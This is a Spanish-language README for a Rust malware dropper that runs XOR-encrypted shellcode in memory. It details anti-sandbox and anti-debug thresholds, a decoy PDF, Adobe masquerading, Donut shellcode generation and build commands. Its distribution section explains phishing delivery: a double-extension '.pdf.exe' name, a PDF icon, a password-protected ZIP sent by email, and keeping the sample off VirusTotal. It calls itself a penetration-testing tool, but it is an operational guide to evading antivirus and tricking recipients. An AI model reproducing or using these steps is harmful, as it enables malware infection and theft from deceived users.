# C2R2 Rust Dropper - Embedded Shellcode

## Descripción

Dropper compilado en Rust con shellcode embebido y encriptado con XOR. Diseñado para evadir Windows Defender y otros antivirus.

### Características de Evasión

- **Shellcode embebido** - No descarga nada de internet
- **XOR encryption** - Shellcode encriptado en el binario
- **Ejecución en memoria** - No toca el disco
- **Anti-sandbox** - Detecta VMs y sandboxes
- **Anti-debug** - Detecta depuradores
- **Strings ofuscados** - `obfstr` en tiempo de compilación
- **PDF decoy** - Abre un PDF señuelo para parecer legítimo
- **Metadata legítimo** - Se disfraza como Adobe Acrobat

## Uso Rápido

### Template Dropper (Desarrollo)

Cuando se ejecuta el dropper sin payload embebido, muestra instrucciones de uso:

```bash
# Ver ayuda
dropper.exe --help

# Ejecutar sin payload (mostrará error informativo)
dropper.exe
```

**Nota**: El dropper template requiere un payload embebido o adjunto para funcionar.
Use el builder para crear un dropper funcional.

## Flujo de Ejecución

1. **Delay inicial** (3 segundos) - Evade aceleración de tiempo de sandbox
2. **Anti-sandbox checks** - Verifica si está en VM/sandbox
3. **Delay aleatorio** - Comportamiento más humano
4. **Abre PDF decoy** - Muestra documento legítimo al usuario
5. **Desencripta shellcode** - XOR decrypt en memoria
6. **Ejecuta shellcode** - VirtualAlloc + VirtualProtect + call

## Generación del Dropper

### Paso 1: Generar Shellcode con Donut

```bash
# Descargar donut desde: https://github.com/TheWover/donut

# Generar shellcode desde agent.exe
donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2

# Parámetros:
#   -i: Input (agent.exe)
#   -o: Output (shellcode.bin)
#   -f 1: Format binario
#   -a 2: Arquitectura x64
```

### Paso 2: Encriptar Shellcode con XOR

```bash
# Usar el builder para encriptar y generar config.rs
./builder build-dropper \
    --shellcode shellcode.bin \
    --decoy factura.pdf \
    --output Factura_2024.exe
```

### Paso 3: Compilar Dropper

```bash
# Cross-compile desde Linux
cargo build --release --target x86_64-pc-windows-gnu --features production -p dropper

# O desde Windows
cargo build --release --features production -p dropper
```

## Estructura del Proyecto

```
dropper-rust/
├── Cargo.toml              # Configuración del proyecto
├── build.rs                # Script de build (recursos Windows)
├── dropper.manifest        # Manifest de Windows
├── src/
│   ├── main.rs            # Punto de entrada
│   ├── config.rs          # Shellcode encriptado y clave XOR
│   ├── shellcode.rs       # Desencriptación y ejecución
│   ├── evasion.rs         # Técnicas anti-sandbox/anti-debug
│   └── decoy.pdf          # PDF señuelo embebido
└── README.md
```

## Personalización

### Cambiar Shellcode

Editar `src/config.rs`:

```rust
// Clave XOR (generar aleatoria para cada build)
pub const XOR_KEY: &[u8] = b"tu_clave_random_de_32_bytes!!!!";

// Shellcode encriptado (generar con builder)
pub const ENCRYPTED_SHELLCODE: &[u8] = &[0x12, 0x34, ...];
```

### Cambiar PDF Decoy

Reemplazar `src/decoy.pdf` con tu propio PDF (factura, documento, etc.)

### Cambiar Icono

Colocar `pdf_icon.ico` en el directorio del dropper para que `build.rs` lo use.

## Técnicas Anti-Sandbox

| Check | Descripción | Umbral |
|-------|-------------|--------|
| Uptime | Tiempo desde boot | < 10 min |
| CPU Cores | Número de núcleos | < 2 |
| RAM | Memoria física | < 4 GB |
| Screen | Resolución | < 1024x768 |
| Mouse | Movimiento del mouse | Sin movimiento en 2s |
| Recent Files | Archivos recientes | < 5 archivos |
| Debugger | IsDebuggerPresent | True |

## Distribución

1. **Renombrar** el ejecutable: `Factura_Diciembre_2024.pdf.exe`
2. **Cambiar icono** a icono de PDF
3. **Comprimir** en ZIP con contraseña para email
4. **No subir** a VirusTotal (quema el hash)

## Técnicas MITRE ATT&CK

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Obfuscated Files | T1027 | Shellcode XOR + strings obfuscados |
| Virtualization Evasion | T1497 | Anti-sandbox checks |
| Process Injection | T1055 | Shellcode en memoria propia |
| Masquerading | T1036 | PDF icon + Adobe metadata |
| User Execution | T1204 | Requiere click del usuario |

## ⚠️ Disclaimer

Este software es exclusivamente para pruebas de penetración autorizadas.
El uso no autorizado es ilegal y punible por ley.
